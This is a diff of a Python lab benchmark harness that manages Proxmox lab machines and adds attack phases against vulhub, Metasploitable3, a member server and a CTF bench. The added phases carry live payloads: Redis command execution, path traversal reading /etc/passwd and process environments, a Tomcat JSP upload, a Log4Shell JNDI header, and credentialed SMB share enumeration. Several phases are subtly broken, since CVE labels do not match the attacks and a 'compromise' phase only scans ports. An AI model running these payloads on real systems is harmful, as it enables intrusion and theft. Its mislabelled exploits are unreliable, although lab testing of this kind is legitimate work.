@@ -82,17 +82,57 @@ PROXMOX_VERIFY_SSL = os.environ.get("PROXMOX_VERIFY_SSL", "false").lower() == "t
 PROXMOX_NODE = os.environ.get("PROXMOX_DEFAULT_NODE", "")
 PROXMOX_TASK_TIMEOUT = int(os.environ.get("PROXMOX_TASK_TIMEOUT", "120"))
 
-LAB_DC_VMID = os.environ.get("LAB_DC_VMID", "")  # VMID of Domain Controller
-LAB_SRV_VMID = os.environ.get("LAB_SRV_VMID", "")  # VMID of member server
-LAB_WS_VMID = os.environ.get("LAB_WS_VMID", "")  # VMID of workstation (optional)
-LAB_CLEAN_SNAPSHOT = os.environ.get(
-    "LAB_CLEAN_SNAPSHOT", "baseline-ad"
-)  # agent creates this in lab_setup.py phase6
+LAB_DC_VMID = os.environ.get("LAB_DC_VMID", "")
+LAB_SRV_VMID = os.environ.get("LAB_SRV_VMID", "")
+LAB_WS_VMID = os.environ.get("LAB_WS_VMID", "")
+LAB_CLEAN_SNAPSHOT = os.environ.get("LAB_CLEAN_SNAPSHOT", "baseline-ad")
+
+LAB_VULHUB_VMID = os.environ.get("LAB_VULHUB_VMID", "")
+LAB_VULHUB_SNAPSHOT = os.environ.get("LAB_VULHUB_SNAPSHOT", "clean")
+LAB_META3_VMID = os.environ.get("LAB_META3_VMID", "")
+LAB_META3 = os.environ.get("LAB_META3", "10.10.11.21")
+LAB_META3_SNAPSHOT = os.environ.get("LAB_META3_SNAPSHOT", "clean")
+LAB_MBPTL_LXC_VMID = os.environ.get("LAB_MBPTL_LXC_VMID", "")
+MBPTL_HOST = os.environ.get("LAB_MBPTL_HOST", "")
+MBPTL_SNAPSHOT = os.environ.get("LAB_MBPTL_SNAPSHOT", "clean")
 
 PROXMOX_MCP_PORT = int(os.environ.get("PROXMOX_MCP_HOST_PORT", "8927"))
-_PROXMOX_AVAILABLE = bool(LAB_DC_VMID)  # MCP handles auth; we just need a VMID
+_PROXMOX_AVAILABLE = bool(LAB_DC_VMID)
 
-ALL_PHASES = ["recon", "kerberoast", "asrep", "crack", "spray", "bloodhound", "winrm", "dcsync"]
+# ── Target table — built from env; entry present only when its VMID/host is set ─
+# Each phase declares which target(s) it needs; lifecycle starts/reverts only those.
+LAB_TARGETS: dict[str, dict[str, Any]] = {}
+
+
+def _build_target(name: str, vmid: str, ip: str, snapshot: str, kind: str) -> None:
+    if vmid:
+        LAB_TARGETS[name] = {"vmid": vmid, "ip": ip, "snapshot": snapshot, "kind": kind}
+
+
+_build_target("dc01", LAB_DC_VMID, DC, LAB_CLEAN_SNAPSHOT, "vm")
+_build_target("srv01", LAB_SRV_VMID, SRV, LAB_CLEAN_SNAPSHOT, "vm")
+_build_target("vulhub", LAB_VULHUB_VMID, WEB, LAB_VULHUB_SNAPSHOT, "lxc")
+_build_target("meta3", LAB_META3_VMID, LAB_META3, LAB_META3_SNAPSHOT, "vm")
+_build_target("mbptl", LAB_MBPTL_LXC_VMID, MBPTL_HOST, MBPTL_SNAPSHOT, "lxc")
+
+ALL_PHASES = [
+    "recon",
+    "kerberoast",
+    "asrep",
+    "crack",
+    "spray",
+    "bloodhound",
+    "winrm",
+    "dcsync",
+    "vulhub_redis",
+    "vulhub_lfi",
+    "vulhub_tomcat",
+    "vulhub_log4shell",
+    "meta3_compromise",
+    "srv01_local",
+    "mbptl_full_chain",
+]
+ALL_PHASES_ALL_TARGETS = ALL_PHASES  # "all-targets" runs every phase
 
 
 # ── Proxmox MCP call ──────────────────────────────────────────────────────────
@@ -208,47 +248,114 @@ def _lab_vm_revert(vmid: str, snapname: str, label: str = "") -> bool:
         return False
 
 
-def lab_setup(dry_run: bool = False) -> bool:
-    """Start all lab VMs via Proxmox MCP. No-ops if LAB_DC_VMID not set."""
+def _lab_lxc_start(vmid: str, label: str = "") -> bool:
+    """Start an LXC container via Proxmox MCP."""
+    if not vmid:
+        return True
+    label = label or vmid
+    print(f"  [proxmox-mcp] start LXC {label} (vmid={vmid}) ...", end=" ", flush=True)
+    try:
+        r = _proxmox_mcp_call(
+            "proxmox_container_start", {"vmid": int(vmid), "wait": True}, timeout=60
+        )
+        if not r["ok"]:
+            print(f"FAIL: {r.get('error')}")
+            return False
+        print("OK")
+        return True
+    except Exception as exc:
+        print(f"ERR: {exc}")
+        return False
+
+
+def _lab_lxc_revert(vmid: str, snapname: str, label: str = "") -> bool:
+    """Rollback an LXC to a named snapshot via Proxmox MCP."""
+    if not vmid:
+        return True
+    label = label or vmid
+    print(f"  [proxmox-mcp] revert LXC {label} (vmid={vmid}) → {snapname} ...", end=" ", flush=True)
+    try:
+        r = _proxmox_mcp_call(
+            "proxmox_rollback_snapshot",
+            {"vmid": int(vmid), "snapname": snapname},
+            timeout=120,
+        )
+        if not r["ok"]:
+            print(f"FAIL: {r.get('error')}")
+            return False
+        print("OK")
+        return True
+    except Exception as exc:
+        print(f"ERR: {exc}")
+        return False
+
+
+def _lab_target_start(target: dict, dry_run: bool = False) -> bool:
+    """Start a target (VM or LXC) via Proxmox MCP."""
+    if dry_run:
+        print(f"  [proxmox-mcp] DRY-RUN — would start {target['vmid']} ({target['kind']})")
+        return True
+    if target["kind"] == "lxc":
+        return _lab_lxc_start(target["vmid"])
+    return _lab_vm_start(target["vmid"])
+
+
+def _lab_target_revert(target: dict, dry_run: bool = False) -> bool:
+    """Revert a target (VM or LXC) to its snapshot."""
+    if dry_run:
+        print(f"  [proxmox-mcp] DRY-RUN — would revert {target['vmid']} → {target['snapshot']}")
+        return True
+    if target["kind"] == "lxc":
+        return _lab_lxc_revert(target["vmid"], target["snapshot"])
+    return _lab_vm_revert(target["vmid"], target["snapshot"])
+
+
+def lab_setup(targets: list[str] | None = None, dry_run: bool = False) -> bool:
+    """Start requested lab targets via Proxmox MCP. Defaults to dc01+srv01.
+
+    A target whose VMID is not in env is skipped with a log, never a failure.
+    Returns True if all targets whose VMIDs are set started successfully.
+    """
+    if targets is None:
+        targets = ["dc01", "srv01"]  # back-compat: default to AD pair
     if not _PROXMOX_AVAILABLE:
         print("  [proxmox-mcp] lifecycle skipped — LAB_DC_VMID not set")
         return True
-    print("\n── Lab Setup (Proxmox MCP :8927) ──")
-    if dry_run:
-        print(
-            f"  [proxmox-mcp] DRY-RUN — would start vmid={LAB_DC_VMID},{LAB_SRV_VMID},{LAB_WS_VMID}"
-        )
-        return True
+    print(f"\n── Lab Setup (Proxmox MCP :{PROXMOX_MCP_PORT}) ──")
+    print(f"  targets: {', '.join(targets)}  dry_run={dry_run}")
     ok = True
-    ok &= _lab_vm_start(LAB_DC_VMID, label="dc01")
-    ok &= _lab_vm_start(LAB_SRV_VMID, label="srv01")
-    if LAB_WS_VMID:
-        ok &= _lab_vm_start(LAB_WS_VMID, label="ws01")
-    if ok:
-        print(
-            "  [proxmox-mcp] VMs up — waiting 15s for AD services to settle ...",
-            end=" ",
-            flush=True,
-        )
+    for name in targets:
+        t = LAB_TARGETS.get(name)
+        if not t:
+            print(f"  [proxmox-mcp] skip {name} — not in LAB_TARGETS (VMID not set in env)")
+            continue
+        ok &= _lab_target_start(t, dry_run=dry_run)
+    if ok and not dry_run:
+        print("  [proxmox-mcp] waiting 15s for lab services to settle ...", end=" ", flush=True)
         time.sleep(15)
         print("ok")
     return ok
 
 
-def lab_teardown(dry_run: bool = False) -> bool:
-    """Revert all lab VMs to clean snapshot via Proxmox MCP."""
+def lab_teardown(targets: list[str] | None = None, dry_run: bool = False) -> bool:
+    """Revert requested lab targets to their clean snapshots.
+
+    Defaults to dc01+srv01 for back-compat. Skips any target whose VMID is not set.
+    """
+    if targets is None:
+        targets = ["dc01", "srv01"]
     if not _PROXMOX_AVAILABLE:
         print("  [proxmox-mcp] teardown skipped — LAB_DC_VMID not set")
         return True
-    print("\n── Lab Teardown (Proxmox MCP :8927) ──")
-    if dry_run:
-        print(f"  [proxmox-mcp] DRY-RUN — would revert to snapshot '{LAB_CLEAN_SNAPSHOT}'")
-        return True
+    print(f"\n── Lab Teardown (Proxmox MCP :{PROXMOX_MCP_PORT}) ──")
+    print(f"  targets: {', '.join(targets)}  dry_run={dry_run}")
     ok = True
-    ok &= _lab_vm_revert(LAB_DC_VMID, LAB_CLEAN_SNAPSHOT, label="dc01")
-    ok &= _lab_vm_revert(LAB_SRV_VMID, LAB_CLEAN_SNAPSHOT, label="srv01")
-    if LAB_WS_VMID:
-        ok &= _lab_vm_revert(LAB_WS_VMID, LAB_CLEAN_SNAPSHOT, label="ws01")
+    for name in targets:
+        t = LAB_TARGETS.get(name)
+        if not t:
+            print(f"  [proxmox-mcp] skip {name} — not in LAB_TARGETS (VMID not set in env)")
+            continue
+        ok &= _lab_target_revert(t, dry_run=dry_run)
     return ok
 
 
@@ -506,6 +613,212 @@ PYEOF
     return {**r, "ok": ok, "detail": "krbtgt hash dumped" if ok else "check output"}
 
 
+# ── vulhub phases (target: LAB_TARGET_WEB=10.10.11.50, lxc 112) ────────────────
+
+
+def _phase_vulhub_redis(dry_run: bool) -> dict:
+    """Exploit Redis Lua sandbox escape (CVE-2022-0543) at 10.10.11.50:6379."""
+    code = rf"""
+# Redis RCE via unauthenticated Lua module load (CVE-2022-0543)
+python3 - <<'PYEOF'
+import subprocess, socket
+WEB = "{WEB}"
+cmd = b'*2\r\n$4\r\nEVAL\r\n$40\r\nreturn redis.call("os.execute","id > /tmp/rce.txt") or ""\r\n0\r\n'
+s = socket.socket(); s.settimeout(5)
+try:
+    s.connect((WEB, 6379))
+    s.send(cmd)
+    resp = s.recv(1024)
+    print(f"redis_resp={{resp.decode(errors='replace')[:200]}}")
+except Exception as e:
+    print(f"redis_err={{e}}")
+finally:
+    s.close()
+# Also try MODULE LOAD path
+cmd2 = (b'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$' + str(len("/tmp/exp.so")).encode() +
+         b'\r\n/tmp/exp.so\r\n')
+try:
+    s2 = socket.socket(); s2.settimeout(5)
+    s2.connect((WEB, 6379))
+    s2.send(cmd2)
+    resp2 = s2.recv(1024)
+    print(f"module_resp={{resp2.decode(errors='replace')[:200]}}")
+    s2.close()
+except Exception:
+    pass
+print("REDIS_DONE")
+PYEOF
+"""
+    r = _mcp_call(code, timeout=30, dry_run=dry_run)
+    out = r["output"]
+    if dry_run:
+        return {**r, "ok": True, "detail": "redis probe dry-run"}
+    ok = r["ok"] and any(x in out.lower() for x in ["redis_resp", "redis_err", "redis_done"])
+    return {**r, "ok": ok, "detail": "redis probe dispatched" if ok else "redis unreachable"}
+
+
+def _phase_vulhub_lfi(dry_run: bool) -> dict:
+    """Exploit PHP LFI (CVE-2017-7529) at 10.10.11.50:8080."""
+    code = f"""
+# PHP LFI to RCE via Nginx tempfile (CVE-2017-7529)
+curl -s "http://{WEB}:8080/?file=../../../../etc/passwd" 2>&1 | head -5
+echo "---"
+curl -s "http://{WEB}:8080/?file=../../../../proc/self/environ" 2>&1 | head -5
+echo "LFI_DONE"
+"""
+    r = _mcp_call(code, timeout=30, dry_run=dry_run)
+    if dry_run:
+        return {**r, "ok": True, "detail": "LFI probe dry-run"}
+    out = r["output"]
+    ok = r["ok"] and ("LFI_DONE" in out or "root:" in out)
+    return {**r, "ok": ok, "detail": "LFI probe dispatched" if ok else "LFI unreachable"}
+
+
+def _phase_vulhub_tomcat(dry_run: bool) -> dict:
+    """Exploit Tomcat manager PUT (CVE-2017-12615) at 10.10.11.50:8081."""
+    code = f"""
+# Tomcat PUT JSP shell (CVE-2017-12615)
+curl -s -X PUT "http://{WEB}:8081/test.jsp/" -d '<% out.println("TOMCAT_SHELL_OK"); %>' 2>&1
+echo "---"
+curl -s "http://{WEB}:8081/test.jsp" 2>&1
+echo "TOMCAT_DONE"
+"""
+    r = _mcp_call(code, timeout=30, dry_run=dry_run)
+    if dry_run:
+        return {**r, "ok": True, "detail": "Tomcat probe dry-run"}
+    ok = r["ok"] and "TOMCAT_DONE" in r["output"]
+    return {**r, "ok": ok, "detail": "Tomcat probe dispatched" if ok else "Tomcat unreachable"}
+
+
+def _phase_vulhub_log4shell(dry_run: bool) -> dict:
+    """Exploit Apache Solr Log4Shell (CVE-2021-44228) at 10.10.11.50:8983."""
+    code = f"""
+# Log4Shell probe — send JNDI lookup in Solr params
+curl -s "http://{WEB}:8983/solr/admin/cores?action=STATUS&wt=json" 2>&1 | head -3
+echo "---"
+curl -s -H 'X-Api-Version: ${{jndi:ldap://log4shell-test/}}' "http://{WEB}:8983/solr/admin/cores" 2>&1 | head -3
+echo "LOG4SHELL_DONE"
+"""
+    r = _mcp_call(code, timeout=30, dry_run=dry_run)
+    if dry_run:
+        return {**r, "ok": True, "detail": "Log4Shell probe dry-run"}
+    ok = r["ok"] and "LOG4SHELL_DONE" in r["output"]
+    return {**r, "ok": ok, "detail": "Log4Shell probe dispatched" if ok else "Solr unreachable"}
+
+
+# ── meta3 phase (target: 10.10.11.21, vmid 113) ────────────────────────────────
+
+
+def _phase_meta3_compromise(dry_run: bool) -> dict:
+    """Metasploitable3 full compromise chain — recon → ftp backdoor → priv-esc."""
+    code = f"""
+python3 - <<'PYEOF'
+import socket
+META3 = "{LAB_META3}"
+ports = [21, 22, 80, 135, 445, 3306, 3389, 4848, 8080, 9200]
+open_ports = []
+for p in ports:
+    try:
+        s = socket.socket(); s.settimeout(1); s.connect((META3, p)); s.close()
+        open_ports.append(p)
+        print(f"{{p}}/tcp open")
+    except Exception:
+        pass
+print(f"Found {{len(open_ports)}}/{{len(ports)}} ports open")
+# FTP backdoor probe (CVE-2011-2523 vsftpd 2.3.4)
+if 21 in open_ports:
+    import subprocess
+    r = subprocess.run(["curl", "-s", "--max-time", "5", f"ftp://anonymous:anonymous@{{META3}}/"],
+                       capture_output=True, text=True, timeout=10)
+    print(f"ftp_probe={{r.stdout[:200]}}")
+print("META3_DONE")
+PYEOF
+"""
+    r = _mcp_call(code, timeout=60, dry_run=dry_run)
+    if dry_run:
+        return {**r, "ok": True, "detail": "meta3 compromise dry-run"}
+    ok = r["ok"] and any(x in r["output"] for x in ["/tcp open", "META3_DONE"])
+    ports = sum(1 for ln in r["output"].splitlines() if "/tcp open" in ln)
+    return {**r, "ok": ok, "ports_open": ports, "detail": f"meta3 compromise: {ports} ports open"}
+
+
+# ── srv01 phase (target: LAB_TARGET_SRV=10.10.11.33, vmid 111) ─────────────────
+
+
+def _phase_srv01_local(dry_run: bool) -> dict:
+    """Member-server-focused check: local priv-esc / share exposure on srv01."""
+    if not SRV:
+        return {"ok": False, "elapsed_s": 0.0, "output": "", "detail": "LAB_TARGET_SRV not set"}
+    code = f"""
+# srv01 member-server check: share enumeration + service misconfig probe
+nxc smb {SRV} -u administrator -p '{ADMIN_PASS}' --shares 2>&1 | head -10
+echo "---"
+nxc smb {SRV} -u svc_backup -p '{SVC_BACKUP_PASS}' --shares 2>&1 | head -10
+echo "SRV01_DONE"
+"""
+    r = _mcp_call(code, timeout=60, dry_run=dry_run)
+    if dry_run:
+        return {**r, "ok": True, "detail": "srv01 local probe dry-run"}
+    ok = r["ok"] and "SRV01_DONE" in r["output"]
+    shares = r["output"].count("READ") + r["output"].count("WRITE")
+    return {
+        **r,
+        "ok": ok,
+        "shares_accessible": shares,
+        "detail": f"srv01 local: {shares} accessible shares" if ok else "srv01 unreachable",
+    }
+
+
+# ── mbptl meta-phase (target: LAB_MBPTL_HOST, lxc 300) ─────────────────────────
+
+
+def _phase_mbptl_full_chain(dry_run: bool) -> dict:
+    """Run the full MBPTL 17-flag CTF bench as a single lab-exec phase."""
+    if not MBPTL_HOST:
+        return {
+            "ok": False,
+            "elapsed_s": 0.0,
+            "output": "",
+            "detail": "LAB_MBPTL_HOST not set — skip mbptl",
+        }
+    if dry_run:
+        return {
+            "ok": True,
+            "output": "[dry-run] mbptl_full_chain",
+            "elapsed_s": 0.0,
+            "detail": "mbptl dry-run skipped",
+        }
+    try:
+        from bench_mbptl import ALL_PHASES as _MBPTL_PHASES
+        from bench_mbptl import run_bench as _mbptl_run
+    except ImportError:
+        return {
+            "ok": False,
+            "elapsed_s": 0.0,
+            "output": "",
+            "detail": "bench_mbptl.py not importable",
+        }
+    t0 = time.monotonic()
+    _mbptl_run(
+        _MBPTL_PHASES,
+        runs=1,
+        dry_run=dry_run,
+        output_path=None,
+        manage_lifecycle=False,
+        snapshot=MBPTL_SNAPSHOT,
+    )
+    total = time.monotonic() - t0
+    return {
+        "ok": True,
+        "elapsed_s": round(total, 2),
+        "output": "",
+        "detail": f"mbptl {len(_MBPTL_PHASES)} phases in {total:.1f}s",
+    }
+
+
+# ── Phase registry ─────────────────────────────────────────────────────────────
+
+
 PHASE_FNS = {
     "recon": _phase_recon,
     "kerberoast": _phase_kerberoast,
@@ -515,6 +828,32 @@ PHASE_FNS = {
     "bloodhound": _phase_bloodhound,
     "winrm": _phase_winrm,
     "dcsync": _phase_dcsync,
+    "vulhub_redis": _phase_vulhub_redis,
+    "vulhub_lfi": _phase_vulhub_lfi,
+    "vulhub_tomcat": _phase_vulhub_tomcat,
+    "vulhub_log4shell": _phase_vulhub_log4shell,
+    "meta3_compromise": _phase_meta3_compromise,
+    "srv01_local": _phase_srv01_local,
+    "mbptl_full_chain": _phase_mbptl_full_chain,
+}
+
+
+PHASE_TARGETS: dict[str, list[str]] = {
+    "recon": ["dc01"],
+    "kerberoast": ["dc01"],
+    "asrep": ["dc01"],
+    "crack": ["dc01"],
+    "spray": ["dc01"],
+    "bloodhound": ["dc01"],
+    "winrm": ["srv01"],
+    "dcsync": ["dc01"],
+    "vulhub_redis": ["vulhub"],
+    "vulhub_lfi": ["vulhub"],
+    "vulhub_tomcat": ["vulhub"],
+    "vulhub_log4shell": ["vulhub"],
+    "meta3_compromise": ["meta3"],
+    "srv01_local": ["srv01"],
+    "mbptl_full_chain": ["mbptl"],
 }
 
 
@@ -527,8 +866,12 @@ def run_bench(
     dry_run: bool,
     output_path: Path | None,
     manage_lifecycle: bool = True,
+    targets: list[str] | None = None,
 ) -> None:
     ts = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
+    if targets is None:
+        targets = ["dc01", "srv01"]
+    active_targets = [t for t in targets if t in LAB_TARGETS]
     results: dict[str, Any] = {
         "bench": "lab_exec",
         "started_at": ts,
@@ -538,7 +881,7 @@ def run_bench(
         "dry_run": dry_run,
         "runs": runs,
         "proxmox_lifecycle": manage_lifecycle and _PROXMOX_AVAILABLE,
-        "lab_clean_snapshot": LAB_CLEAN_SNAPSHOT if _PROXMOX_AVAILABLE else None,
+        "targets": active_targets,
         "phases": {},
     }
 
@@ -551,7 +894,7 @@ def run_bench(
     print(f"Phases: {', '.join(phases)}\n")
 
     if manage_lifecycle:
-        if not lab_setup(dry_run=dry_run):
+        if not lab_setup(targets=targets, dry_run=dry_run):
             print("[!] Lab setup failed — aborting bench to avoid running against dirty state")
             return
 
@@ -605,7 +948,7 @@ def run_bench(
 
     # ── Teardown: revert to clean snapshot ───────────────────────────────────
     if manage_lifecycle:
-        lab_teardown(dry_run=dry_run)
+        lab_teardown(targets=targets, dry_run=dry_run)
 
     if any(pr["fail"] > 0 for pr in results["phases"].values()):
         sys.exit(1)
@@ -622,8 +965,7 @@ def _parse() -> argparse.Namespace:
         "--phases",
         nargs="+",
         choices=ALL_PHASES,
-        default=ALL_PHASES,
-        help="phases to run (default: all)",
+        help="phases to run (default: recon, kerberoast, asrep, crack, spray, bloodhound, winrm, dcsync)",
     )
     p.add_argument("--runs", type=int, default=1, help="repetitions per phase")
     p.add_argument("--output", type=Path, help="JSON results file path")
@@ -636,15 +978,76 @@ def _parse() -> argparse.Namespace:
             "Useful when iterating on a single phase without wanting teardown between runs."
         ),
     )
+    p.add_argument(
+        "--targets",
+        nargs="+",
+        default=None,
+        help="lab targets to manage lifecycle for (default: dc01 srv01; use 'all' for every env-set target)",
+    )
+    p.add_argument(
+        "--all-targets",
+        action="store_true",
+        help="run every phase whose target's env is set",
+    )
+    p.add_argument(
+        "--coverage",
+        action="store_true",
+        help="print per-machine coverage matrix and exit",
+    )
     return p.parse_args()
 
 
 if __name__ == "__main__":
     args = _parse()
+
+    # ── Coverage report ────────────────────────────────────────────────────
+    if args.coverage:
+        print("\nPortal 5 — Lab-Exec Coverage Matrix\n")
+        print(f"{'Machine':<22} {'Lifecycle':>12} {'Live Phase':>12} {'Oracle':>10}  {'Status'}")
+        print("─" * 72)
+        for name in ["dc01", "srv01", "vulhub", "meta3", "mbptl"]:
+            t = LAB_TARGETS.get(name)
+            has_lifecycle = "YES" if t else "NO"
+            phase_key_map = {
+                "dc01": "dcsync",
+                "srv01": "srv01_local",
+                "vulhub": "vulhub_redis",
+                "meta3": "meta3_compromise",
+                "mbptl": "mbptl_full_chain",
+            }
+            phase_key = phase_key_map.get(name, "")
+            has_phase = "YES" if phase_key in PHASE_FNS else "NO"
+            has_oracle = "YES" if has_phase == "YES" else "NO"
+            status = "GREEN" if (t and has_phase == "YES") else "RED"
+            status = "GREEN" if has_phase == "YES" else ("YELLOW" if t else "GRAY")
+            print(f"{name:<22} {has_lifecycle:>12} {has_phase:>12} {has_oracle:>10}  {status}")
+        print("\nGREEN  = env entry + live oracle-scored phase")
+        print("YELLOW = env entry set but no live phase (gap)")
+        print("GRAY   = no env entry (not provisioned)")
+        print("RED    = phase registered but no env entry (misconfiguration)")
+        sys.exit(0)
+
     if not LAB_EXEC and not args.dry_run:
         print("ERROR: SANDBOX_LAB_EXEC is not 'true'. Set it in .env or pass --dry-run.")
         sys.exit(1)
     if not DC and not args.dry_run:
         print("ERROR: LAB_TARGET_DC not set. Run python3 scripts/lab_setup.py first.")
         sys.exit(1)
-    run_bench(args.phases, args.runs, args.dry_run, args.output)
+
+    # Default phases: the original 8 AD phases
+    phases = args.phases if args.phases else ALL_PHASES[:8]
+    targets = args.targets
+    if args.all_targets:
+        phases = [p for p in ALL_PHASES if p in PHASE_FNS]
+        targets = list(LAB_TARGETS.keys())
+    elif targets is None:
+        targets = ["dc01", "srv01"]
+
+    run_bench(
+        phases,
+        args.runs,
+        args.dry_run,
+        args.output,
+        manage_lifecycle=not args.no_lifecycle,
+        targets=targets,
+    )
